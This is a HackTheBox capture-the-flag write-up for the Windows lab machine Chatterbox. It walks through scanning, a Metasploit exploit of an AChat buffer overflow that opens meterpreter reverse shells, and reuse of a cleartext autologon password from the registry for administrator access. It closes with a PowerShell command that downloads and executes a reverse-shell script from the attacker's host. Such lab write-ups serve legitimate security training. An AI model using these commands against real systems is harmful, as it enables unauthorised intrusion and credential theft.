---
layout: post
name: chatterbox
title: "HackTheBox: Chatterbox"
date: 2022-05-25 09:00:00 +1000
categories: red-team
tags: windows achat buffer-overflow wdigest impacket
summary: /msg administrator time to change your password?
excerpt_separator: <!--more-->
---

**Chatterbox** is a Windows-based machine authored by *lkys37en*, with an average rating of 4.0 stars.

<!--more-->

<p align="center"><img src="/assets/images/chatterbox/main.png" /></p>

### // Lessons Learned
1. Process migration in meterpreter is easily configured via AutoRunScript, and should always be tested if a target is continuously dropping sessions.
2. Powershell over meterpreter is a pretty ugly experience (scripts can be run, but not interactively). While there are powershell-specific payloads in Metasploit, none are them appear to be staged, meaning a large payload size that may be unusable (as it was in the case of this box, given the maximum buffer available to be exploited). Where possible, a native Powershell & netcat setup is probably the way to go.

### // Recon
```
┌──(kali㉿kali)-[~/HTB/chatterbox]
└─$ nmap -A -p- chatterbox.htb                       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-25 09:10 AEST
Nmap scan report for chatterbox.htb (10.10.10.74)
Host is up (0.050s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 4h59m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-05-25T04:11:51
|_  start_date: 2022-05-25T04:07:23
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-05-25T00:11:52-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.52 seconds
```

Nmap reveals this is likely a Windows 7 machine running the following services:
- `rpc` on port `135`
- `SMB` services (`netbios` on `139` and `microsoft-ds` on `445`)
- an `Achat` server on port `9255` (http) and `9256` (achat protocol)

An anonymous RPC session can be established, but all commands look to be disabled without authentication:
```
┌──(kali㉿kali)-[~/HTB/chatterbox]
└─$ rpcclient -U "" -N chatterbox.htb
rpcclient $> srvinfo
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> lookupsids
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $>
```

Predictably for SMB, both `guest` and `anonymous` access appear disabled:
```
┌──(kali㉿kali)-[~/HTB/chatterbox]
└─$ crackmapexec smb chatterbox.htb -u 'guest' -p ''
SMB         chatterbox.htb  445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         chatterbox.htb  445    CHATTERBOX       [-] Chatterbox\guest: STATUS_ACCOUNT_DISABLED 
                                                                                                                                                                      
┌──(kali㉿kali)-[~/HTB/chatterbox]
└─$ crackmapexec smb chatterbox.htb -u '' -p ''     
SMB         chatterbox.htb  445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         chatterbox.htb  445    CHATTERBOX       [-] Chatterbox\: STATUS_ACCESS_DENIED
```

### // Initial Foothold
Designed for use in LANs, [AChat](https://achat.en.softonic.com/) is a lightweight messaging and file-transfer application (think very early precursor to [Slack](https://slack.com/), but closer in functionality to [mIRC](https://www.mirc.com/) for those who are old enough to remember). Nmap is unable to identify the specific version running, but some online searching reveals a [remote buffer overflow](https://www.exploit-db.com/exploits/36025) exploit in version `0.150 beta7`, which seems worth testing out. The exploit is available as both a [github repo](https://github.com/Juggernoobs/achat_reverse_tcp_exploit) and [metasploit module](https://www.rapid7.com/db/modules/exploit/windows/misc/achat_bof/), but behind the scenes it's really the same thing (msfvenom payload and multi/handler listener). Running through metasploit initially looks promising:
```                                                                                         
Payload options (windows/meterpreter/reverse_tcp):                                                
                                                                                                  
   Name      Current Setting  Required  Description                                               
   ----      ---------------  --------  -----------                                               
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.17.230     yes       The listen address (an interface may be specified)
   LPORT     443              yes       The listen port                                           
                                                 
Exploit target:                                                                                   
                                                 
   Id  Name                                                                                       
   --  ----                                      
   0   Wildcard Target                                                                            
                                                                                                  
msf6 exploit(multi/handler) > run                                                                 
                                                                                                  
[*] Started reverse TCP handler on 10.10.17.230:443                                               
[*] Sending stage (175174 bytes) to 10.10.10.74   
[*] Meterpreter session 1 opened (10.10.17.230:443 -> 10.10.10.74:49159) at 2022-05-25 10:46:54 +1000
```

But unfortunately, the session dies shortly thereafter on every attempt:
```
meterpreter >
[*] 10.10.10.74 - Meterpreter session 1 closed.  Reason: Died
```

After several successive attempts the Achat server stops responding, possibly due to corruption of the process and requiring a restart to fix. Swapping from the staged `windows/meterpreter/reverse_tcp` payload to the stageless `windows/meterpreter_reverse_tcp`, or even changing to http-based payloads doesn't seem to solve the issue. [Why is your Meterpreter session dying?](https://www.infosecmatter.com/why-is-your-meterpreter-session-dying-try-these-fixes/) provides some excellent insights into what might be happening here, along with some possible explanations, including incompatible versions, incorrect payload architectures and, as seems applicable in this case, that the process may simply be the victim of anti-virus or EDR on the target. Adding an auto-run script to migrate to the `explorer.exe` process as soon as the connection is established is easy enough:
```
msf6 exploit(multi/handler) > set AutoRunScript "migrate -n explorer.exe"
AutoRunScript => migrate -n explorer.exe
```

And now when we run the module, the connection doesn't die:
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.17.230:443 
[*] Sending stage (175174 bytes) to 10.10.10.74
[*] Session ID 7 (10.10.17.230:443 -> 10.10.10.74:49158) processing AutoRunScript 'migrate -n explorer.exe'
[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.
[!] Example: run post/windows/manage/migrate OPTION=value [...]
[*] Current server process: AChat.exe (2872)
[+] Migrating to 1600
[+] Successfully migrated to process 
[*] Meterpreter session 7 opened (10.10.17.230:443 -> 10.10.10.74:49158) at 2022-05-25 10:53:40 +1000
```

From here, we can drop into a native shell, move to the home directory for the user `alfred`, and retrieve the user flag:
```
meterpreter > shell
Process 1904 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred

C:\Windows\system32>cd C:\Users\alfred
cd C:\Users\alfred

C:\Users\Alfred>type Desktop\user.txt
type Desktop\user.txt
1d2df***************************
```

### // Privilege Escalation

Begining with privilege enumeration, we can quickly ascertain that the user we've exploited doesn't have any special privileges that might be useful in achieving escalation, nor are they a member of any privileged groups:
```
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Windows\system32>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192  Mandatory group, Enabled by default, Enabled group
```

Looking closer at the AChat service that was exploited to gain a foothold on the system, an `updates.ini` in the program directory file confirms that the target is running the exact version targeted by the buffer overflow vulnerability, `0.15.0`:
```
Directory of C:\Users\Alfred\AppData\Roaming\AChat

12/10/2017  10:21 AM    <DIR>          .
12/10/2017  10:21 AM    <DIR>          ..
01/04/2021  04:53 AM               224 updates.ini
               1 File(s)            224 bytes
               2 Dir(s)   3,346,743,296 bytes free

C:\Users\Alfred\AppData\Roaming\AChat>type updates.ini
type updates.ini
[LatestVersion]
internalVer=150
verMajor=0
verMinor=9
verRelease=8
verBuild=191
setupURL=http://achat.sourceforge.net/download.htm
releaseDate=39107
setupNeeded=1
updateSize=2130775
MD5setup=cb3a95e260d178355ab163cfba82cfd9
```

There's also a scheduled task, `Reset AChat service`, that restarts the `Achat.exe` server every minute. This was probably responsible for our original meterpreter sessions consistenly dying soon after connection, rather than any kind of A.V / EDR:
```
C:\Users\Alfred\Desktop>schtasks
schtask

Folder: \
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
Reset AChat service                      5/27/2022 8:00:00 AM   Running

C:\Users\Alfred\Desktop>schtasks /v /query /tn "Reset AChat service" /fo list
schtasks /v /query /tn "Reset AChat service" /fo list

Folder: \
HostName:                             CHATTERBOX
TaskName:                             \Reset AChat service
Next Run Time:                        5/27/2022 8:05:00 AM
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        5/27/2022 8:04:39 AM
Last Result:                          0
Author:                               CHATTERBOX\Alfred
Task To Run:                          "C:\Users\Alfred\AppData\Local\Microsoft\Windows Media\reset.bat" 
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          CHATTERBOX\Alfred
Delete Task If Not Rescheduled:       Enabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute 
Start Time:                           5:10:00 PM
Start Date:                           1/30/2018
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        0 Hour(s), 1 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

C:\Users\Alfred\Desktop>type C:\Users\Alfred\AppData\Local\Microsoft\"Windows Media"\reset.bat
type C:\Users\Alfred\AppData\Local\Microsoft\"Windows Media"\reset.bat
taskkill /f /im AChat.exe & start /min "" "c:\Program Files\AChat\AChat.exe"
```

Eventually though, the path to privilege escalation is found via stored credentials. Checking the registry for automatic logon confirms it has been enabled for the `alfred` user, and the password is stored in cleartext. This insecure storage is thanks to the enabling of `WDigest`, a long-since deprecated authentication protocol. While WDigest communicates via HTTP over SASL, it ultimately [caches the credentials in memory in cleartext](https://www.triskelelabs.com/blog/wdigest-extracting-passwords-in-cleartext), making them an easy target for theft:
```
C:\Users\Alfred\Desktop>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!
```

The hash of this user's password, `Welcome1!`, could also have been retrieved as an NTLMv2 hash, and cracked offline using a tool like [hashcat](https://hashcat.net/hashcat/). But WDigest makes this unnecessary, and in this case the same passsword provides access to the `administrator` account:

```
┌──(kali㉿kali)-[~/HTB/chatterbox]
└─$ crackmapexec smb chatterbox.htb -u 'administrator' -p 'Welcome1!'
SMB         chatterbox.htb  445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         chatterbox.htb  445    CHATTERBOX       [+] Chatterbox\administrator:Welcome1! (Pwn3d!)
```

Interestingly if we use these credentials to login with the [windows/smb/psexec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) metasploit module, we actually get a shell as `nt authority\system` instead, and can't access the root flag:
```
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.17.230:4443 
[*] 10.10.10.74:445 - Connecting to the server...
[*] 10.10.10.74:445 - Authenticating to 10.10.10.74:445 as user 'Administrator'...
[*] 10.10.10.74:445 - Selecting PowerShell target
[*] 10.10.10.74:445 - Executing the payload...
[+] 10.10.10.74:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.74
[*] Meterpreter session 11 opened (10.10.17.230:4443 -> 10.10.10.74:49162) at 2022-05-30 08:57:47 +1000

meterpreter > shell
Process 2668 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
Access is denied.

C:\Windows\system32>whoami
whoami
nt authority\system
```

This is because the psexec module, despite requiring admin credentials, starts a service as the `nt authority\system` user. If all we wanted to do was grab the flag, we could do so via SMB:
```
┌──(kali㉿kali)-[~/HTB/chatterbox]
└─$ smbclient \\\\CHATTERBOX\\C$ -U 'administrator'
Enter WORKGROUP\administrator's password: 
Try "help" to get a list of possible commands.
smb: \> get \Users\Administrator\Desktop\root.txt
getting file \Users\Administrator\Desktop\root.txt of size 34 as \Users\Administrator\Desktop\root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

But if we actually want to achieve an adminstrator shell, we need to establish a new session. Logging in with [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py), which uses `WMI / Windows Management Instrumentation`, rather than the `SMB` protocol,  delivers an `adminstrator` shell, from which we can also retrieve the root flag in the usual location:
```
┌──(kali㉿kali)-[~/HTB/chatterbox]
└─$ impacket-wmiexec administrator:'Welcome1!'@chatterbox.htb
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
chatterbox\administrator

C:\>type C:\Users\Administrator\Desktop\root.txt
55ba8fa91c67c325b93e43e36672b0a9
```

Alternatively, we could have done this via a Powershell reverse shell, by supplying the administrator credentials when establishing the connection:
```
# listen on port 9001 on attack box
$ nc -lvnp 9001

# setup an adminstrator credential object on the target
$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)

# Download and invoke a powershell reverse shell script from our attack box
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).DownloadString('http://10.10.17.230:443/rev-shell-script.ps1')" -Credential $cred
```

![](/assets/images/chatterbox/1.png)